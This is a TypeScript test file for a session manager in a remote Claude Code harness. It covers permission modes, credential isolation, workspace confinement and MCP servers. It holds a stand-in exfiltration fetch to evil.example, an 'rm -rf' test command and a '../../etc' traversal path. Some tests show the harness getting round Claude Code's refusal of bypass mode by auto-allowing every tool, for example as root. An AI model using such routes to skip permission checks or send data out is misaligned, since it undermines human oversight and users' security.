import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AgentToHubMessage, ManagedMcpServer } from '@remote-harness/shared';
import { SessionManager } from '../src/sessionManager.ts';

// A stand-in for the SDK's query(): records the options it was given and ends immediately.
function fakeQuery(opts: { hold?: Promise<void> } = {}) {
  const calls: any[] = [];
  const modes: string[] = [];
  const query = ((args: any) => {
    calls.push(args.options);
    return {
      [Symbol.asyncIterator]: async function* () {
        if (opts.hold) await opts.hold;
      },
      interrupt: async () => {},
      setPermissionMode: async (m: string) => {
        modes.push(m);
      },
      setModel: async () => {},
      applyFlagSettings: async () => {},
      setMcpServers: async () => {},
      mcpServerStatus: async () => [],
      close: () => {},
    };
  }) as never;
  return { calls, modes, query };
}

const make = (opts: Record<string, unknown> = {}, hold?: Promise<void>) => {
  const sent: AgentToHubMessage[] = [];
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
  const fq = fakeQuery({ hold });
  const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query: fq.query, ...opts } as never);
  return { manager, sent, dir, calls: fq.calls, modes: fq.modes };
};
const start = (m: SessionManager, text = 'hi') => m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text });

describe('SessionManager', () => {
  it('reports an error for an unknown session id instead of silently starting a fresh conversation', () => {
    const { manager, sent, calls } = make();
    manager.handleUserInput({ type: 'user_input', sessionId: 'not-a-known-session', text: 'hi' });
    assert.equal(sent.length, 1);
    assert.equal(sent[0].type, 'error');
    assert.match((sent[0] as { message: string }).message, /unknown session/i);
    assert.equal(calls.length, 0, 'no conversation may be started');
    assert.deepEqual(manager.summaries(), []);
  });

  it('only uses the MCP servers the hub installed: a repo\'s own .mcp.json is ignored (strictMcpConfig)', () => {
    const { manager, calls } = make();
    start(manager);
    assert.equal(calls[0].strictMcpConfig, true);
  });

  it('never hands the hub credentials to the Claude process, with or without an account profile', () => {
    process.env.HUB_TOKEN = 'tenant-wide-secret';
    process.env.HUB_URL = 'wss://hub.example/agent';
    try {
      const a = make();
      start(a.manager);
      assert.equal('HUB_TOKEN' in (a.calls[0].env ?? {}), false);
      assert.equal('HUB_URL' in (a.calls[0].env ?? {}), false);
      assert.ok(a.calls[0].env?.PATH, 'the rest of the environment is still there');

      const sent: AgentToHubMessage[] = [];
      const dir = mkdtempSync(join(tmpdir(), 'sm-test-'));
      const fq = fakeQuery();
      const m = new SessionManager(dir, dir, [{ id: 'work', label: 'work', configDir: join(dir, 'cfg') }], (x) => sent.push(x), { query: fq.query } as never);
      start(m);
      assert.equal('HUB_TOKEN' in (fq.calls[0].env ?? {}), false);
      assert.equal(fq.calls[0].env.CLAUDE_CONFIG_DIR, join(dir, 'cfg'));
    } finally {
      delete process.env.HUB_TOKEN;
      delete process.env.HUB_URL;
    }
  });

  it('keeps a new session\'s working directory inside the workspace', () => {
    const { manager, calls, dir } = make();
    manager.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', cwd: '../../etc' });
    assert.equal(calls[0].cwd, dir);
  });

  it('in a managed worker, the agent\'s own files and WebFetch still ask; ordinary work does not', async () => {
    const { manager, sent, calls, dir } = make({ managed: true, protectedPaths: ['/opt/agent'] });
    start(manager);
    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
    const signal = new AbortController().signal;
    assert.equal((await canUse('Bash', { command: 'ls' }, { signal })).behavior, 'allow');
    assert.equal((await canUse('Write', { file_path: join(dir, 'a.txt') }, { signal })).behavior, 'allow');

    const pending = canUse('WebFetch', { url: 'https://evil.example/?d=x' }, { signal });
    await new Promise((r) => setTimeout(r, 20));
    const req = sent.find((m) => m.type === 'permission_request') as { requestId: string; toolName: string };
    assert.equal(req.toolName, 'WebFetch');
    manager.resolvePermission(req.requestId, 'deny');
    assert.equal((await pending).behavior, 'deny');

    const pending2 = canUse('Write', { file_path: '/opt/agent/src/index.ts' }, { signal });
    await new Promise((r) => setTimeout(r, 20));
    assert.ok(sent.filter((m) => m.type === 'permission_request').length >= 2, "writing the agent's own code asks");
    const req2 = sent.filter((m) => m.type === 'permission_request').at(-1) as { requestId: string };
    manager.resolvePermission(req2.requestId, 'deny');
    await pending2;
  });

  it('does not install a hub-pushed MCP server whose name collides with another\'s tool namespace', async () => {
    const { manager, calls } = make();
    const mk = (name: string): ManagedMcpServer => ({ name, url: 'https://x.example/', autoAllow: true, updatedAt: '' });
    await manager.setMcpServers([mk('good'), mk('a__b')]);
    start(manager);
    assert.deepEqual(Object.keys(calls[0].mcpServers), ['good']);
  });

  it('answers a pending permission card with a denial when its session ends, and prunes it', async () => {
    const { manager, sent, calls } = make();
    start(manager);
    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
    const p = canUse('Bash', { command: 'rm -rf x' }, { signal: new AbortController().signal });
    await new Promise((r) => setTimeout(r, 50)); // the (empty) fake session ends immediately
    const verdict = await Promise.race([p, new Promise((r) => setTimeout(() => r('HUNG'), 500))]);
    assert.deepEqual(typeof verdict === 'object' ? (verdict as { behavior: string }).behavior : verdict, 'deny');
    assert.ok(sent.some((m) => m.type === 'session_ended'));
  });

  it('reports a rejected model switch to the phone instead of crashing the agent', async () => {
    // The SDK rejects set_model for a model id its catalog doesn't know; an unhandled rejection used to kill the process.
    let release!: () => void;
    const held = new Promise<void>((r) => { release = r; });
    const fail = async () => { throw new Error('"claude-x" isn\'t described by this version\'s model catalog'); };
    const query = (() => ({
      [Symbol.asyncIterator]: async function* () { await held; },
      interrupt: fail, setPermissionMode: fail, setModel: fail, applyFlagSettings: fail,
      setMcpServers: async () => {}, mcpServerStatus: async () => [], close: () => {},
    })) as never;
    const sent: AgentToHubMessage[] = [];
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query } as never);
    const unhandled: unknown[] = [];
    const onUnhandled = (e: unknown) => unhandled.push(e);
    process.on('unhandledRejection', onUnhandled);
    try {
      start(manager);
      manager.setModel('t1', 'claude-x');
      manager.setEffort('t1', 'high');
      manager.setPermissionMode('t1', 'default');
      manager.interrupt('t1');
      await new Promise((r) => setTimeout(r, 50));
      assert.deepEqual(unhandled, []);
      const errors = sent.filter((m) => m.type === 'error') as { message: string; sessionId?: string }[];
      assert.equal(errors.length, 4);
      assert.match(errors[0].message, /model catalog/);
    } finally {
      process.off('unhandledRejection', onUnhandled);
      release();
    }
  });
  // A stand-in that reports a session id like the real SDK, then stays running until released.
  function initQuery(sessionId: string) {
    const calls: any[] = [];
    const modes: string[] = [];
    let release!: () => void;
    const held = new Promise<void>((r) => { release = r; });
    const query = ((args: any) => {
      calls.push(args.options);
      return {
        [Symbol.asyncIterator]: async function* () {
          yield { type: 'system', subtype: 'init', session_id: sessionId };
          await held;
        },
        interrupt: async () => {}, setPermissionMode: async (m: string) => { modes.push(m); }, setModel: async () => {},
        applyFlagSettings: async () => {}, setMcpServers: async () => {}, mcpServerStatus: async () => [], close: () => {},
      };
    }) as never;
    return { calls, modes, query, release: () => release() };
  }
  const tick = () => new Promise((r) => setTimeout(r, 20));

  it('a chat resumed after its run ended keeps the permission mode the phone chose (it used to restart in default)', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const first = initQuery('s-1');
    const sent: AgentToHubMessage[] = [];
    const m1 = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (x) => sent.push(x), { query: first.query } as never);
    start(m1);
    await tick();
    m1.setPermissionMode('s-1', 'auto');
    await tick();
    assert.deepEqual(first.modes, ['auto'], 'the running chat is switched at once');
    first.release();
    await tick();

    // The agent restarts (or the run ends); the phone's next message resumes the chat.
    const second = initQuery('s-1');
    const m2 = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query: second.query } as never);
    m2.handleUserInput({ type: 'user_input', sessionId: 's-1', text: 'go on' });
    assert.equal(second.calls[0].permissionMode, 'auto');
    assert.equal(second.calls[0].resume, 's-1');
    second.release();
  });

  it('a mode sent while the chat is not running is kept for the run the next message starts', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const q = initQuery('s-2');
    const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query: q.query } as never);
    start(m);
    await tick();
    q.release();
    await tick();
    assert.equal(m.isLive('s-2'), false);
    m.setPermissionMode('s-2', 'acceptEdits'); // what the phone sends just before the message
    m.handleUserInput({ type: 'user_input', sessionId: 's-2', text: 'next' });
    assert.equal(q.calls[1].permissionMode, 'acceptEdits');
  });

  it('a mode picked before the machine named a new chat is saved with it', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const q = initQuery('s-3');
    const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query: q.query } as never);
    start(m);
    m.setPermissionMode('t1', 'auto'); // still under its temporary id
    await tick();
    q.release();
    await tick();
    assert.equal(m.sessionRegistry.get('s-3')?.permissionMode, 'auto');
  });

  it('a new chat starts in default, and bypass is only passed with its explicit opt-in', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const q = initQuery('s-4');
    const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query: q.query } as never);
    start(m);
    assert.equal(q.calls[0].permissionMode, 'default');
    assert.equal('allowDangerouslySkipPermissions' in q.calls[0], false);
    await tick();
    m.setPermissionMode('s-4', 'bypassPermissions');
    q.release();
    await tick();
    m.handleUserInput({ type: 'user_input', sessionId: 's-4', text: 'x' });
    assert.equal(q.calls[1].permissionMode, 'bypassPermissions');
    assert.equal(q.calls[1].allowDangerouslySkipPermissions, true);
  });

  describe('a chat keeps its mode, model and effort', () => {
    // A query that says who it is (init), records what was asked of it, and stays open until released.
    function recordingQuery(sessionId = 'real-1') {
      const calls: any[] = [];
      const controls: string[] = [];
      let release!: () => void;
      const held = new Promise<void>((r) => { release = r; });
      const query = ((args: any) => {
        calls.push(args.options);
        return {
          [Symbol.asyncIterator]: async function* () {
            yield { type: 'system', subtype: 'init', session_id: args.options.resume ?? sessionId };
            await held;
          },
          interrupt: async () => {},
          setPermissionMode: async (m: string) => { controls.push(`mode:${m}`); },
          setModel: async (m?: string) => { controls.push(`model:${m}`); },
          applyFlagSettings: async (f: unknown) => { controls.push(`flags:${JSON.stringify(f)}`); },
          setMcpServers: async () => {},
          mcpServerStatus: async () => [],
          close: () => {},
        };
      }) as never;
      return { calls, controls, query, release: () => release() };
    }
    const tick = () => new Promise((r) => setTimeout(r, 20));
    const managerWith = (dir: string, query: never) => new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query } as never);

    it('a new chat starts with what came with its first message, and remembers it once named', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', permissionMode: 'auto', model: 'claude-opus-4-8', effort: 'high' });
      await tick();
      assert.equal(q.calls[0].permissionMode, 'auto');
      assert.equal(q.calls[0].effort, 'high');
      assert.deepEqual(q.controls, ['model:claude-opus-4-8']);
      const saved = JSON.parse(readFileSync(join(dir, 'data', 'sessions.json'), 'utf-8'))[0];
      assert.deepEqual([saved.sessionId, saved.permissionMode, saved.model, saved.effort], ['real-1', 'auto', 'claude-opus-4-8', 'high']);
      q.release();
    });

    it('a change made while the chat is not running is kept, and the chat resumes with it', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      mkdirSync(join(dir, 'data'), { recursive: true });
      writeFileSync(join(dir, 'data', 'sessions.json'), JSON.stringify([{ sessionId: 's1', cwd: dir, title: 'x', createdAt: 'now', accountId: 'default' }]));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      // Not running: these used to be dropped, and the next message resumed the chat with the defaults.
      m.setPermissionMode('s1', 'acceptEdits');
      m.setEffort('s1', 'max');
      m.setModel('s1', 'claude-sonnet-5');
      m.handleUserInput({ type: 'user_input', sessionId: 's1', text: 'carry on' });
      await tick();
      assert.equal(q.calls[0].resume, 's1');
      assert.equal(q.calls[0].permissionMode, 'acceptEdits');
      assert.equal(q.calls[0].effort, 'max');
      assert.deepEqual(q.controls, ['model:claude-sonnet-5']);
      q.release();
    });

    it('what comes with a message wins over what was kept; bypass starts with its explicit opt-in', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      mkdirSync(join(dir, 'data'), { recursive: true });
      writeFileSync(join(dir, 'data', 'sessions.json'), JSON.stringify([{ sessionId: 's1', cwd: dir, title: 'x', createdAt: 'now', accountId: 'default', permissionMode: 'plan', model: 'claude-x', effort: 'low' }]));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      m.handleUserInput({ type: 'user_input', sessionId: 's1', text: 'go', permissionMode: 'bypassPermissions', model: '', effort: null });
      await tick();
      // Claude Code refuses a later switch to bypass in a run launched without the opt-in, so the run starts in it.
      assert.equal(q.calls[0].permissionMode, 'bypassPermissions');
      assert.equal(q.calls[0].allowDangerouslySkipPermissions, true);
      assert.equal('effort' in q.calls[0], false);
      assert.deepEqual(q.controls, []);
      const saved = JSON.parse(readFileSync(join(dir, 'data', 'sessions.json'), 'utf-8'))[0];
      assert.deepEqual([saved.permissionMode, saved.model, saved.effort], ['bypassPermissions', '', null]);
      q.release();
    });

    it('with nothing sent and nothing kept, a resumed chat runs as before (default mode)', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-choices-')));
      mkdirSync(join(dir, 'data'), { recursive: true });
      writeFileSync(join(dir, 'data', 'sessions.json'), JSON.stringify([{ sessionId: 's1', cwd: dir, title: 'x', createdAt: 'now', accountId: 'default' }]));
      const q = recordingQuery();
      const m = managerWith(dir, q.query);
      m.handleUserInput({ type: 'user_input', sessionId: 's1', text: 'go' });
      await tick();
      assert.equal(q.calls[0].permissionMode, 'default');
      assert.equal('effort' in q.calls[0], false);
      assert.deepEqual(q.controls, []);
      q.release();
    });
  });

  it('streams the reply as it is written (sdk_partial) without storing the stream events themselves', async () => {
    const sent: AgentToHubMessage[] = [];
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const events = [
      { type: 'system', subtype: 'init', session_id: 'real-1', mcp_servers: [] },
      { type: 'stream_event', parent_tool_use_id: null, event: { type: 'message_start' } },
      { type: 'stream_event', parent_tool_use_id: null, event: { type: 'content_block_delta', delta: { type: 'text_delta', text: 'Hello' } } },
    ];
    let options: any;
    const query = ((args: any) => {
      options = args.options;
      return {
        [Symbol.asyncIterator]: async function* () {
          for (const e of events) yield e;
          await new Promise((r) => setTimeout(r, 400)); // the throttle sends the text while the reply is still going
          yield { type: 'assistant', uuid: 'u1', message: { content: [{ type: 'text', text: 'Hello there' }] } };
          yield { type: 'result', subtype: 'success', uuid: 'u2' };
        },
        interrupt: async () => {}, setPermissionMode: async () => {}, setModel: async () => {}, applyFlagSettings: async () => {},
        setMcpServers: async () => {}, mcpServerStatus: async () => [], close: () => {},
      };
    }) as never;
    const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (x) => sent.push(x), { query } as never);
    m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi' });
    await new Promise((r) => setTimeout(r, 700));
    assert.equal(options.includePartialMessages, true);
    const partials = sent.filter((x) => x.type === 'sdk_partial') as { sessionId: string; text: string }[];
    assert.deepEqual(partials.map((p) => [p.sessionId, p.text]), [['real-1', 'Hello']]);
    const forwarded = sent.filter((x) => x.type === 'sdk_message').map((x) => (x as { message: { type: string } }).message.type);
    assert.ok(!forwarded.includes('stream_event'), 'raw stream events never reach the hub');
    assert.deepEqual(forwarded, ['system', 'assistant', 'result']);
    const iPartial = sent.findIndex((x) => x.type === 'sdk_partial');
    const iAssistant = sent.findIndex((x) => x.type === 'sdk_message' && (x as { message: { type: string } }).message.type === 'assistant');
    assert.ok(iPartial < iAssistant);
  });

  describe('the machine\'s own default mode (DEFAULT_PERMISSION_MODE, from the owner\'s plan)', () => {
    type CanUse = (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string; message?: string }>;
    const signal = new AbortController().signal;
    const notRoot = { isRoot: false };

    it('a bypass machine starts a chat nobody chose a mode for in bypass, with the opt-in', () => {
      const { manager, calls } = make({ defaultMode: 'bypassPermissions', ...notRoot });
      start(manager);
      assert.equal(calls[0].permissionMode, 'bypassPermissions');
      assert.equal(calls[0].allowDangerouslySkipPermissions, true);
    });

    it('a mode chosen in the app wins over the machine default, and the opt-in stays so it can be switched back', () => {
      const { manager, calls } = make({ defaultMode: 'bypassPermissions', ...notRoot });
      manager.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', permissionMode: 'default' });
      assert.equal(calls[0].permissionMode, 'default');
      assert.equal(calls[0].allowDangerouslySkipPermissions, true);
    });

    it('turns the app\'s "Autonomous" into bypass there: Claude Code\'s own auto mode refuses commands and tells the person to run them', async () => {
      let release!: () => void;
      const { manager, calls, modes } = make({ defaultMode: 'bypassPermissions', ...notRoot }, new Promise<void>((r) => (release = r)));
      manager.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', permissionMode: 'auto' });
      assert.equal(calls[0].permissionMode, 'bypassPermissions');
      manager.setPermissionMode('t1', 'plan');
      manager.setPermissionMode('t1', 'auto');
      await new Promise((r) => setTimeout(r, 10));
      assert.deepEqual(modes, ['plan', 'bypassPermissions'], 'a mode the person picked on purpose is kept');
      release();
    });

    it('in bypass it answers what still reaches it by itself: everything is allowed, and a question is handed back', async () => {
      const { manager, sent, calls } = make({ defaultMode: 'bypassPermissions', ...notRoot });
      start(manager);
      const canUse = calls[0].canUseTool as CanUse;
      assert.equal((await canUse('Bash', { command: 'sudo apt-get install -y jq' }, { signal })).behavior, 'allow');
      const asked = await canUse('AskUserQuestion', { questions: [] }, { signal });
      assert.equal(asked.behavior, 'deny');
      assert.match(asked.message ?? '', /decide/i);
      assert.equal(sent.filter((m) => m.type === 'permission_request').length, 0, 'nothing was sent to the phone');
    });

    it('as root (where Claude Code refuses bypass) it runs in default mode without the opt-in and allows everything itself', async () => {
      const { manager, sent, calls } = make({ defaultMode: 'bypassPermissions', isRoot: true });
      start(manager);
      assert.equal(calls[0].permissionMode, 'default');
      assert.equal('allowDangerouslySkipPermissions' in calls[0], false);
      const canUse = calls[0].canUseTool as CanUse;
      assert.equal((await canUse('Bash', { command: 'apt-get install -y jq' }, { signal })).behavior, 'allow');
      assert.equal(sent.filter((m) => m.type === 'permission_request').length, 0);
    });

    it('an ordinary machine starts chats in default mode and passes the app\'s choice through unchanged', async () => {
      let release!: () => void;
      const { manager, calls, modes } = make({ ...notRoot }, new Promise<void>((r) => (release = r)));
      start(manager);
      assert.equal(calls[0].permissionMode, 'default');
      assert.equal('allowDangerouslySkipPermissions' in calls[0], false);
      manager.setPermissionMode('t1', 'auto');
      await new Promise((r) => setTimeout(r, 10));
      assert.deepEqual(modes, ['auto']);
      release();
    });
  });

  describe('switching a running chat to bypass when it was started without the opt-in', () => {
    // A run that names itself, then answers each message with a result when told to, until it is closed.
    function turnQuery(sessionId: string) {
      const calls: any[] = [];
      const modes: string[] = [];
      let closed = 0;
      let next!: (v: 'result' | 'end') => void;
      const query = ((args: any) => {
        calls.push(args.options);
        let wait = new Promise<'result' | 'end'>((r) => (next = r));
        return {
          [Symbol.asyncIterator]: async function* () {
            yield { type: 'system', subtype: 'init', session_id: sessionId };
            for (;;) {
              const v = await wait;
              if (v === 'end') return;
              wait = new Promise((r) => (next = r));
              yield { type: 'result', subtype: 'success' };
            }
          },
          interrupt: async () => {},
          setPermissionMode: async (m: string) => {
            modes.push(m);
          },
          setModel: async () => {}, applyFlagSettings: async () => {}, setMcpServers: async () => {}, mcpServerStatus: async () => [],
          close: () => {
            closed++;
            next('end');
          },
        };
      }) as never;
      return { calls, modes, query, endTurn: () => next('result'), closed: () => closed };
    }
    const tick = () => new Promise((r) => setTimeout(r, 20));
    const plain = 'This chat switches to Bypass permissions the next time it starts.';

    it('says so plainly (once), and once the turn is over the next message resumes the chat in bypass', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
      const q = turnQuery('s-9');
      const sent: AgentToHubMessage[] = [];
      const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (x) => sent.push(x), { query: q.query, isRoot: false } as never);
      start(m);
      await tick();
      m.setPermissionMode('s-9', 'bypassPermissions');
      m.setPermissionMode('s-9', 'bypassPermissions'); // the phone repeats it before each message
      const notes = sent.filter((x) => x.type === 'error').map((x) => (x as { message: string }).message);
      assert.deepEqual(notes, [plain]);
      assert.deepEqual(q.modes, [], 'Claude Code is not asked for a switch it refuses');
      assert.equal(q.closed(), 0, 'the turn that is running is left to finish');

      q.endTurn();
      await tick();
      assert.equal(q.closed(), 1);
      assert.equal(m.isLive('s-9'), false);
      assert.equal(sent.filter((x) => x.type === 'error').length, 1, 'closing it on purpose is not reported as a failure');

      m.handleUserInput({ type: 'user_input', sessionId: 's-9', text: 'go on' });
      assert.equal(q.calls[1].resume, 's-9');
      assert.equal(q.calls[1].permissionMode, 'bypassPermissions');
      assert.equal(q.calls[1].allowDangerouslySkipPermissions, true);
      await tick();
      assert.equal(m.isLive('s-9'), true);
    });

    it('pressing Stop while the switch waits for the turn restarts it then', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
      const q = turnQuery('s-11');
      const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query: q.query, isRoot: false } as never);
      start(m);
      await tick();
      m.setPermissionMode('s-11', 'bypassPermissions');
      assert.equal(q.closed(), 0);
      m.interrupt('s-11');
      await tick();
      assert.equal(q.closed(), 1);
      assert.equal(m.isLive('s-11'), false);
    });

    it('a chat that is between turns is closed at once, and switching back before then keeps it running', async () => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
      const q = turnQuery('s-10');
      const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], () => {}, { query: q.query, isRoot: false } as never);
      start(m);
      await tick();
      m.setPermissionMode('s-10', 'bypassPermissions');
      m.setPermissionMode('s-10', 'acceptEdits');
      q.endTurn();
      await tick();
      assert.equal(q.closed(), 0, 'the person changed their mind: nothing to restart');
      assert.deepEqual(q.modes, ['acceptEdits']);
      m.setPermissionMode('s-10', 'auto'); // Autonomous on an ordinary machine is Claude Code's own auto mode: no restart
      await tick();
      assert.equal(q.closed(), 0);
      m.setPermissionMode('s-10', 'bypassPermissions');
      await tick();
      assert.equal(q.closed(), 1);
      assert.equal(m.sessionRegistry.get('s-10')?.permissionMode, 'bypassPermissions');
    });
  });
});

describe('defaultModeFrom (DEFAULT_PERMISSION_MODE)', () => {
  it('takes a known mode and falls back to default for anything else', async () => {
    // config.ts insists on these at import; nothing connects anywhere.
    process.env.HUB_URL ||= 'ws://127.0.0.1:1/agent';
    process.env.HUB_TOKEN ||= 'test';
    const { defaultModeFrom } = await import('../src/config.ts');
    assert.equal(defaultModeFrom('bypassPermissions'), 'bypassPermissions');
    assert.equal(defaultModeFrom(' default '), 'default');
    assert.equal(defaultModeFrom(undefined), 'default');
    assert.equal(defaultModeFrom(''), 'default');
    assert.equal(defaultModeFrom('yolo'), 'default');
  });
});
